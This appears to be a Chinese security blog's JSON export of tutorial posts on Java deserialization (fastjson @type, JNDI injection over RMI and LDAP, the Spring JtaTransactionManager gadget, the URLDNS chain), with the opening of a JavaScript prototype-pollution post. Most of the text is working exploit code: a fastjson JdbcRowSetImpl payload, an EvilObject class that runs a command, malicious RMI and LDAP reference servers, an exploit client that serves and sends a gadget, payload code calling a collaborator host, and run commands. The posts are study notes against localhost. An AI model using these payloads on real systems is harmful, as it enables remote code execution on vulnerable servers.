com.alibaba.fastjson.JSONObject;import com.alibaba.fastjson.serializer.SerializerFeature;public class fastjsonTest &#123; public static void main(String[] args)&#123; Student student = new Student(); student.setName(&quot;halfblue&quot;); student.setAge(18);// System.out.println(&#x27;1&#x27;); String jsonstring = JSON.toJSONString(student); System.out.println(jsonstring); System.out.println(&#x27;2&#x27;); String jsonstring2 = JSON.toJSONString(student, SerializerFeature.WriteClassName); System.out.println(jsonstring2); System.out.println(&#x27;3&#x27;); Student obj = JSON.parseObject(jsonstring, Student.class); System.out.println(&#x27;4&#x27;); Object parse = JSON.parse(jsonstring); System.out.println(&#x27;5&#x27;); Object parse1 = JSON.parse(jsonstring2); System.out.println(&quot;type:&quot;+ parse.getClass().getName() +&quot; &quot;+parse); System.out.println(&quot;type:&quot;+ parse1.getClass().getName() +&quot; &quot;+parse1); &#125;&#125;构造函数setNamesetAge1getAgegetName&#123;&quot;age&quot;:18,&quot;name&quot;:&quot;halfblue&quot;&#125;2getAgegetName&#123;&quot;@type&quot;:&quot;Student&quot;,&quot;age&quot;:18,&quot;name&quot;:&quot;halfblue&quot;&#125;3构造函数setAgesetName45构造函数setAgesetNametype:com.alibaba.fastjson.JSONObject &#123;&quot;name&quot;:&quot;halfblue&quot;,&quot;age&quot;:18&#125;type:Student Student@6438a396 可以看到当指定了@type时，才能反序列化出指定类型的对象，并且这个过程会调用类的set方法。序列化时toJSONString时要加上SerializerFeature.WriteClassName参数才会指定@type。实际上fastjson就是省去了我们自己写readObject的代码，直接实现了反序列化。那么问题就处在，如果反序列化时对对象类型设置的太过宽松，就可能引入任意类。如果该类的getter、setter、构造函数中有可被利用的代码就会导致代码执行。当然如果指定类的上述函数中有可被利用的代码也一样。 123456789import com.alibaba.fastjson.JSON;public class rcetest &#123; public static void main(String[] args) &#123; String jsonstring =&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://127.0.0.1:1389/allwbj\\&quot;, \\&quot;autoCommit\\&quot;:true&#125;&quot;; JSON.parse(jsonstring); &#125;&#125; 服务可以用java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc.exe -A 127.0.0.1这个工具开，比较方便分析下原理，根据JSON.parse 1234567891011public static Object parse(String text, int features) &#123; if (text == null) &#123; return null; &#125; else &#123; DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features); Object value = parser.parse(); parser.handleResovleTask(value); parser.close(); return value; &#125; &#125; 调用了DefaultJSONParser.parse，继续跟进是一个switch，跳到了case12 123case 12: JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField)); return this.parseObject((Map)object, fieldName); 再跟进JSONObject的parseObject，这里就是遍历解析输入字符串，获取类名，得到类名后走到TypeUtils.loadClass引入了该类，然后调用了FastjsonASMDeserializer.deserialze() 12345if (object.size() &lt;= 0) &#123; ObjectDeserializer deserializer = this.config.getDeserializer(clazz); thisObj = deserializer.deserialze(this, clazz, fieldName); return thisObj;&#125; 到deserialze函数就没办法动态调试了，最后看静态代码是调用了JdbcRowSetImpl的setDataSourceName和setAutoCommit这两个set函数，前者赋值了rmi/ladp服务地址，后者调用了InitialContext.lookup()引起了JNDI注入。所以其实前面的代码都不重要，只是正常的反序列化过程。关键就是JSON.parse指定@type并赋值时会调用指定类的特定set方法，正好JdbcRowSetImpl的setAutoCommit方法存在JNDI注入。反序列化也只是个引子。 参考链接http://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E","categories":[],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://yoursite.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"java反序列化连续剧二","slug":"java反序列化连续剧二","date":"2020-03-23T07:57:16.000Z","updated":"2020-03-30T14:25:26.000Z","comments":true,"path":"2020/03/23/java反序列化连续剧二/","link":"","permalink":"http://yoursite.com/2020/03/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9E%E7%BB%AD%E5%89%A7%E4%BA%8C/","excerpt":"上一篇写了readObject的简单利用，这篇写一下RMI/JNDI这些java特有的特性以及JNDI注入。有一些java反序列化漏洞主要就是利用JNDI注入，反序列化只是个触发点。","text":"上一篇写了readObject的简单利用，这篇写一下RMI/JNDI这些java特有的特性以及JNDI注入。有一些java反序列化漏洞主要就是利用JNDI注入，反序列化只是个触发点。RMI(Java Remote Method Invocation)是Java里一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。简单来说这个功能就是调用其他机器上的java程序，比如客户端C要调用服务端S上的java代码，RMI作为注册中心连接两者。打个比方就是C要买S卖的东西，但S需要先在RMI那里注册(类似淘宝开店)，然后C向RMI(淘宝)查询S，就这么简单。RMI技术是让客户端和服务端在不同jvm上执行java代码。比如客户端只有一个对象接口而没有具体的实现，需要调用服务端的对象。这里有两种传递对象的方法：1、传递远程对象(对象实现Remote接口)，得到的是一个带着ip地址和内存地址的指针。两个JVM拥有同一个对象。2、传递序列化对象(对象实现serializable接口)，得到的服务端对象的副本，两个JVM中的对象不同。来看一个例子，尝试用RMI实现一个买东西问价的功能，首先在client端和server端各定义一个相同的shop类接口，为了远程传递这个接口要实现Remote接口 12345678910import java.rmi.*;/** * 接口类 * */public interface shop extends Remote&#123; double getPrice(String description) throws RemoteException;&#125; 然后在server端实现这个接口,远程对象实现时需要继承UnicastRemoteObject这个类。这个实现类的功能就是用hashmap实现很简单的查询。 1234567891011121314151617181920212223import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.HashMap;import java.util.Map;public class shopImpl extends UnicastRemoteObject implements shop&#123; private Map&lt;String, Double&gt; prices; public shopImpl() throws RemoteException &#123; //物品列表 prices = new HashMap&lt;&gt;(); prices.put(&quot;sugar&quot;, 2.0); prices.put(&quot;book&quot;, 10.0); &#125; public double getPrice(String description) throws RemoteException &#123; Double price = prices.get(description); return price == null ? 0 : price; &#125;&#125; 然后创建rmi服务并且注册 123456789101112import java.rmi.Naming;import java.rmi.registry.LocateRegistry;public class RMIServer &#123; public static void main(String[] args) throws Exception &#123; shopImpl centralshop = new shopImpl(); //创建要传递的对象 LocateRegistry.createRegistry(8001); //创建注册中心 Naming.rebind(&quot;rmi://127.0.0.1:8001/shop&quot;, centralshop); //绑定对象 &#125;&#125; 接下来就是客户端连接这个rmi中心获取内容 12345678910111213141516import javax.naming.NamingException;import java.net.MalformedURLException;import java.rmi.Naming;import java.rmi.NotBoundException;import java.rmi.RemoteException;public class RMIClient &#123; public static void main(String[] args) throws NamingException, RemoteException, MalformedURLException, NotBoundException &#123; shop centralshop = (shop) Naming.lookup(&quot;rmi://127.0.0.1:8001/shop&quot;); //从注册中心获取对象的引用 String descr = &quot;sugar&quot;; double price = centralshop.getPrice(descr); //调用服务端的类的方法 //System.out.println(centralshop.getClass().getName()); //类型为$Proxy0 System.out.println(descr + &quot;: &quot; + price); &#125;&#125; 调用过程很清晰，就几行，这就是rmi的作用，类似于socket。RMI其实是一个基于序列化的java远程方法调用机制，所以如果服务端存在漏洞组件版本，是可能被利用导致RCE的。但并不是很常见的攻击手段。常用手法是把rmi和jndi注入结合。接下来介绍下JNDI，JNDI(Java Naming and DirectoryInterface)是一个用来查找资源的技术。通过将名字和对象绑定，可以通过名字检索指定的对象。JNDI一般用来代替jdbc连数据库，它的好处是复用性更高，更加灵活(一般来说灵活就意味着不安全)，比如我们把上面的代码从纯RMI版本改写为JNDI版本： 1234567891011121314151617181920212223242526272829303132//serverimport javax.naming.InitialContext;import java.rmi.registry.LocateRegistry;public class JNDIRMIServer &#123; public static void main(String[] args) throws Exception &#123; shopImpl centralshop = new shopImpl(); LocateRegistry.createRegistry(8001);//定义端口号 InitialContext ctx = new InitialContext(); ctx.rebind(&quot;rmi://127.0.0.1:8001/shop&quot;, centralshop); &#125;&#125;//clientimport javax.naming.InitialContext;import javax.naming.NamingException;import java.rmi.RemoteException;public class JNDIRMIClient &#123; public static void main(String[] args) throws NamingException, RemoteException &#123; InitialContext ctx = new InitialContext(); shop centralshop = (shop) ctx.lookup(&quot;rmi://127.0.0.1:8001/shop&quot;); System.out.println(centralshop.getClass().getName()); //输入参数 取得结果 String descr = &quot;sugar&quot;; double price = centralshop.getPrice(descr); System.out.println(descr + &quot;: &quot; + price); &#125;&#125; 虽然看上去没有太大区别，只是使用的从Naming类换成了javax.naming类。但JNDI的灵活性在于，可以切换不同的协议(rmi、ldap、corba)，并且除了直接绑定对象之外，还可以通过References类来绑定一个外部的远程对象。JNDI注入实际上就是在客户端的InitialContext.lookup(URI)这里发生，如果URL是可控的,攻击者可以控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类，这样目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例，达到RCE的效果。这也就解释了为什么RCE却不是在RMI服务端发生的，实际上服务端也执行了代码，但只返回了Reference，具体的代码是在客户端执行的。实际上受害者是RMI客户端，攻击者是RMI服务端。可以看这个图方便理解 某种意义上和ssrf的302跳转有点像把上面的服务端代码改成jndi注入的版本，需要在jdk&lt;8u121下才能正常运行。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647//恶意classimport java.io.IOException;public class EvilObject &#123; public EvilObject() throws IOException &#123; Runtime.getRuntime().exec(&quot;calc.exe&quot;); &#125;&#125;//恶意RMIserverimport com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.InitialContext;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;public class JNDIReferRMIServer &#123; public static void main(String[] args) throws Exception &#123; Reference reference = new Reference(&quot;EvilObject&quot;,&quot;EvilObject&quot;,&quot;http://127.0.0.1:8877/&quot;);//放一个恶意class。不用url的话把恶意类放在同一目录下，第三个参数随便写，也可以 ReferenceWrapper wrapper = new ReferenceWrapper(reference); LocateRegistry.createRegistry(8001);//定义端口号 InitialContext ctx = new InitialContext(); ctx.rebind(&quot;rmi://127.0.0.1:8001/EvilObj&quot;,wrapper); &#125;&#125;//RMIclientimport javax.naming.InitialContext;import javax.naming.NamingException;import java.rmi.RemoteException;public class JNDIRMIClient &#123; public static void main(String[] args) throws NamingException, RemoteException &#123; System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);//如果jdk版本高于8u121需要配置安全策略 InitialContext ctx = new InitialContext(); shop centralshop = (shop) ctx.lookup(&quot;rmi://127.0.0.1:8001/EvilObj&quot;);//假设可以控制url，把绑定的地址修改为恶意服务器 //类型转换会出错，后面的代码不会执行 System.out.println(centralshop.getClass().getName()); //输入参数 取得结果 String descr = &quot;sugar&quot;; double price = centralshop.getPrice(descr); System.out.println(descr + &quot;: &quot; + price); &#125;&#125; RMI客户端(被攻击的服务器)运行后弹出计算器。这是RMI客户端绑定地址可控导致的，当然如果是RMI服务端的reference参数可控也是一样的，相当于正常的服务端就变成恶意服务端了。接下来看下反序列化和JNDI的结合，一个实际的漏洞，Spring的反序列化漏洞，参考https://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection获取作者的源码后，切到client和server目录下，分别执行 1234567#servermvn install&quot;C:\\Program Files\\Java\\jdk1.8.0_73\\bin\\java.exe&quot; -cp &quot;target/*&quot; ExploitableServer 9999#clientmvn installjava -cp &quot;target/*&quot; ExploitClient 127.0.0.1 9999 127.0.0.1 服务端会执行ExportObject中的代码简单分析下调用过程，服务端实际上只是用socket获取了一个object，然后调用了它的readObject方法，做了一次反序列化。 12345678910111213141516171819202122public class ExploitableServer &#123; public static void main(String[] args) &#123; try &#123; ServerSocket serverSocket = new ServerSocket(Integer.parseInt(args[0])); System.out.println(&quot;Server started on port &quot;+serverSocket.getLocalPort()); while(true) &#123; Socket socket=serverSocket.accept(); System.out.println(&quot;Connection received from &quot;+socket.getInetAddress()); ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream()); try &#123; Object object = objectInputStream.readObject(); System.out.println(&quot;Read object &quot;+object); &#125; catch(Exception e) &#123; System.out.println(&quot;Exception caught while reading object&quot;); e.printStackTrace(); &#125; &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 然后是客户端，其实和上面的过程差不多，我写了下注释 12345678910111213141516171819202122232425262728293031323334353637383940public class ExploitClient &#123; public static void main(String[] args) &#123; try &#123; //输入 受害机地址 受害者端口 攻击机地址 String serverAddress = args[0]; int port = Integer.parseInt(args[1]); String localAddress= args[2]; //启动一个http服务用来下载恶意类 System.out.println(&quot;Starting HTTP server&quot;); HttpServer httpServer = HttpServer.create(new InetSocketAddress(80), 0); httpServer.createContext(&quot;/&quot;,new HttpFileHandler()); httpServer.setExecutor(null); httpServer.start(); //启动一个RMI服务端，绑定恶意类，让受害机连接 System.out.println(&quot;Creating RMI Registry&quot;); Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new javax.naming.Reference(&quot;ExportObject&quot;,&quot;ExportObject&quot;,&quot;http://&quot;+serverAddress+&quot;/&quot;); ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference); registry.bind(&quot;Object&quot;, referenceWrapper); //socket连接受害机 System.out.println(&quot;Connecting to server &quot;+serverAddress+&quot;:&quot;+port); Socket socket=new Socket(serverAddress,port); System.out.println(&quot;Connected to server&quot;); String jndiAddress = &quot;rmi://&quot;+localAddress+&quot;:1099/Object&quot;; //生成一个JtaTransactionManager类，这个类的readObject方法存在漏洞 org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager(); object.setUserTransactionName(jndiAddress); //参数可控，导致JNDI注入 //发送这个类，攻击完成 System.out.println(&quot;Sending object to server...&quot;); ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream()); objectOutputStream.writeObject(object); objectOutputStream.flush(); while(true) &#123; Thread.sleep(1000); &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 该漏洞发生在 org.springframework.transaction.jta.JtaTransactionManager类中，直接看这个类的readObject方法 1234567891011private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ois.defaultReadObject(); this.jndiTemplate = new JndiTemplate(); initUserTransactionAndTransactionManager(); initTransactionSynchronizationRegistry(); &#125;&#125; 再看看initUserTransactionAndTransactionManager这个方法 123456789101112131415161718protected void initUserTransactionAndTransactionManager() throws TransactionSystemException &#123; if (this.userTransaction == null) &#123; if (StringUtils.hasLength(this.userTransactionName)) &#123; this.userTransaction = lookupUserTransaction(this.userTransactionName); this.userTransactionObtainedFromJndi = true; &#125; else &#123; this.userTransaction = retrieveUserTransaction(); if ((this.userTransaction == null) &amp;&amp; (this.autodetectUserTransaction)) &#123; this.userTransaction = findUserTransaction(); &#125; &#125; &#125; ...... 看到了lookup，参数是this.userTransactionName，也就是我们通过setUserTransactionName传入的恶意类地址，再跟进lookupUserTransaction这个函数 12345678910111213protected TransactionManager lookupTransactionManager(String transactionManagerName) throws TransactionSystemException &#123; try &#123; if (this.logger.isDebugEnabled()) &#123; this.logger.debug(&quot;Retrieving JTA TransactionManager from JNDI location [&quot; + transactionManagerName + &quot;]&quot;); &#125; return (TransactionManager)getJndiTemplate().lookup(transactionManagerName, TransactionManager.class); &#125; catch (NamingException ex) &#123; &#125; throw new TransactionSystemException(&quot;JTA TransactionManager is not available at JNDI location [&quot; + transactionManagerName + &quot;]&quot;, ex); &#125; 这里获取到了一个JndiTemplate，然后调用了它的lookup方法，参数还是我们传入的地址，也就是这里存在JNDI注入。但是前面的利用都有个前提，就是jdk版本限制在JDK 6u141、7u131、8u121之前，那么对于新一点的jdk，还可以用ldap代替rmi，这种方法可以适用到JDK 11.0.1、8u191、7u201、6u211，看代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102//serverimport java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;public class LdapServer &#123; private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;; public static void main (String[] args) &#123; String url = &quot;http://127.0.0.1:8000/#EvilObject&quot;; int port = 1234; try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( &quot;listen&quot;, InetAddress.getByName(&quot;0.0.0.0&quot;), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; /** * */ public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; /** * &#123;@inheritDoc&#125; * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;)); System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl); e.addAttribute(&quot;javaClassName&quot;, &quot;Exploit&quot;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(&#x27;#&#x27;); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; e.addAttribute(&quot;javaCodeBase&quot;, cbstring); e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; 然后是被攻击的ldap客户端,写法和rmi一样 123456789101112131415161718import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;public class LdapClient &#123; public static void main(String[] args) throws Exception&#123; try &#123; Context ctx = new InitialContext(); ctx.lookup(&quot;ldap://localhost:1234/EvilObject&quot;); String data = &quot;This is LDAP Client.&quot;; //System.out.println(serv.service(data)); &#125; catch (NamingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125;&#125; 需要准备一个unboundid-ldapsdk.jar 12345javac -cp unboundid-ldapsdk.jar LdapServer.javajava -classpath unboundid-ldapsdk.jar;. LdapServerjavac LdapClient.javajava LdapClient 本地版本8u121，运行客户端后后弹计算器这个服务端的写法其实是固定的，也就没有去研究，可以用现成的工具https://github.com/welk1n/JNDI-Injection-Exploit至于JDK 6u141、7u131、8u121之后的版本，限制了ldap调用reference，暂时没有通用解决方法，只能从受害机本机上寻找利用链，比如利用CommonsCollections漏洞等。 参考链接https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdfhttps://www.freebuf.com/column/189835.htmlhttps://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5https://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injectionhttps://www.aqniu.com/threat-alert/13382.html","categories":[],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://yoursite.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"java反序列化连续剧一","slug":"java反序列化连续剧一","date":"2020-03-21T15:26:26.000Z","updated":"2020-03-23T03:08:14.000Z","comments":true,"path":"2020/03/21/java反序列化连续剧一/","link":"","permalink":"http://yoursite.com/2020/03/21/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9E%E7%BB%AD%E5%89%A7%E4%B8%80/","excerpt":"最近看了些java反序列化的文章，感觉都不是太有逻辑，写个文章边记录边整理。估计内容太多，可能要写几篇。这篇先写单纯的反序列化，不涉及rmi/jndi等内容。","text":"最近看了些java反序列化的文章，感觉都不是太有逻辑，写个文章边记录边整理。估计内容太多，可能要写几篇。这篇先写单纯的反序列化，不涉及rmi/jndi等内容。和python、php类似，java也有序列化和反序列化的功能，自然也存在类似的安全问题。将对象序列化其实就是将对象转换为字节序列，方便保存和传输。先写一个正常的序列化和反序列化过程看看。首先定义一个类，这个类需要继承Serializable才能被反序列化。这个接口其实是空的，只是相当于一个标记。然后需要定义serialVersionUID，否则可能会因为序列化的版本号不同报错。 12345678910111213141516import java.io.Serializable;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.FileInputStream;import java.io.FileOutputStream;class Person implements Serializable &#123; private static final long serialVersionUID = 1L; public String name; public int age; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125;&#125; 然后定义序列化的函数，其实就是调用ObjectOutputStream的writeObject方法，将传入的对象保存到文件。文件开头是16进制aced0005 1234567891011public class serial &#123; public static void ser(Object obj)&#123; try (//创建一个ObjectOutputStream输出流 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;object.txt&quot;))) &#123; //将对象序列化到文件 oos.writeObject(obj); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; 反序列化的函数，其实就是调用ObjectInputStream的readObject方法，从文件中读取对象。反序列化创建对象的过程是和构造函数无关的，即使修改构造函数也不会改变生成的类的内容。 123456789101112131415161718 public static void unser() &#123; try (//创建一个ObjectInputStream输入流 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;object.txt&quot;))) &#123; Person p = (Person) ois.readObject(); System.out.println(p.name); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; //主函数 public static void main(String[] args) throws Exception &#123; Person person = new Person(&quot;halfblue&quot;, 23); ser(person); unser(); &#125;&#125; 其实和别的语言差不多，核心就是writeObject和readObject两个方法(感觉相当于php的serialize和unserialize)。而反序列化过程其实只调用了readObject这一个函数。所以利用方法也就是找重写了这个函数的类，再调用重写过的readObject方法(有点像python反序列化的reduce)。比如给上面的person类重写个弹计算器的readObject 123456789101112131415class Person implements Serializable &#123; private static final long serialVersionUID = 1L; public String name; public int age; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; private void readObject(java.io.ObjectInputStream in) throws IOException,ClassNotFoundException&#123; in.defaultReadObject();//调用原始的readOject方法 Runtime.getRuntime().exec(&quot;calc.exe&quot;); &#125;&#125; 这样反序列化的时候会执行重写后的readObject，弹个计算器。当然这只是观察重写readObject会有什么效果，真实环境不会有这样的代码。但有可能有某个类重写了readObject方法，被反序列化的时候实现了某些意料之外的效果。分析个实例，p神推荐的URLDNS利用链，来自ysoserial。首先是漏洞代码vul.java： 123456789import java.io.FileInputStream;import java.io.ObjectInputStream;public class vul &#123; public static void main(String[] args) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); ois.readObject(); &#125;&#125; 其实这行代码就相当于php中的unserialize(file_get_contents(“out.bin”))，非常直白。然后分析下生成序列化文件的代码，这里的效果是在反序列化时实现一个dns请求，类似一个盲ssrf的效果。 1234567891011public static void main(String[] args) throws Exception &#123; HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); URL url = new URL(&quot;http://mj9zyafbickia0sjiv3m19nvkmqde2.burpcollaborator.net&quot;);//burp的collaborator Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);//利用反射修改私有属性 f.setAccessible(true); //URL类的hashCode属性是private的，需要setAccessible //f.set(url, 123);可以设置hashCode不等于-1避免在序列化阶段发送DNS请求 hashMap.put(url, &quot;xxx&quot;); //第二个参数随意取值，不重要，但需要是可以序列化的 f.set(url, -1); //注意要先hashMap.put再执行这一行，因为执行put之后hashCode已经不为-1，需要重新赋值为-1才能在反序列化时再次计算hashCode，触发DNS请求 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;)); oos.writeObject(hashMap); &#125; 分析下原理：这段代码最后传到writeObject的是一个HashMap类型的对象，所以肯定是HashMap的readObject重写了，跟进去看一下： 12345678910111213141516171819202122232425262728293031323334353637383940private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125; &#125; 根据ysoserial的注释，是hash操作触发了DNS，所以跟一下最后一行的hash函数 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 这个hash函数调用了key的hashCode方法，这里的key是URL类型的对象，而这个类正好有个hashCode方法,所以这里调用的就不是HashMap类的hashCode而是URL的hashCode了，长这样： 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; &#125; hashCode等于-1的时候调用handler.hashCode，再看看handler的hashCode是什么： 123456789101112131415161718192021222324252627282930313233343536protected int hashCode(URL u) &#123; int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) &#123; h += addr.hashCode(); &#125; else &#123; String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); &#125; // Generate the file part. String file = u.getFile(); if (file != null) h += file.hashCode(); // Generate the port part. if (u.getPort() == -1) h += getDefaultPort(); else h += u.getPort(); // Generate the ref part. String ref = u.getRef(); if (ref != null) h += ref.hashCode(); return h; &#125; 中间的InetAddress addr = getHostAddress(u)这里调用了getHostAddress方法，这个方法一看名字就是发起了DNS请求，分析到此结束。 可以发现其实利用方法和php的差不多，也是利用不同类同名的方法。调用链就是HashMap.readObject()-&gt;HashMap.putVal()-&gt;HashMap.hash()-&gt;URL.hashCode() 参考链接https://xz.aliyun.com/t/7157https://www.heibai.org/post/1529.html","categories":[],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://yoursite.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"最好的语言之javascript原型链污染","slug":"最好的语言之javascript原型链污染","date":"2020-03-16T14:46:44.000Z","updated":"2020-05-22T07:27:00.000Z","comments":true,"path":"2020/03/16/最好的语言之javascript原型链污染/","link":"","permalink":"http://yoursite.com/2020/03/16/%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80%E4%B9%8Bjavascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","excerpt":"趁着放假继续学点一直没学的，js相关的一些安全问题也是越来越常见了，先看下最出名的原型链污染。感想就是js也是最好的语言有力竞争者，面向对象的用法离谱。","text":"趁着放假继续学点一直没学的，js相关的一些安全问题也是越来越常见了，先看下最出名的原型链污染。感想就是js也是最好的语言有力竞争者，面向对象的用法离谱。所谓原型链其实就是js面向对象编程中的一个特性，所以先介绍下js的面向对象。虽然ES6之后也有class、extends之类看上去很正常的写法了，但那些也都是语法糖，还是要了解下一言难尽的ES5写法。首先，类的定义关键字是function(惊不惊喜意不意外)，写法就是正常类的写法，但叫做构造函数 123456789 function A(name,age)&#123; this.name = name; this.age = age; this.say = function()&#123; console.log(&quot;hi&quot;); &#125; &#125; var a = new A(&#x27;a&#x27;,18)a.say() //hi 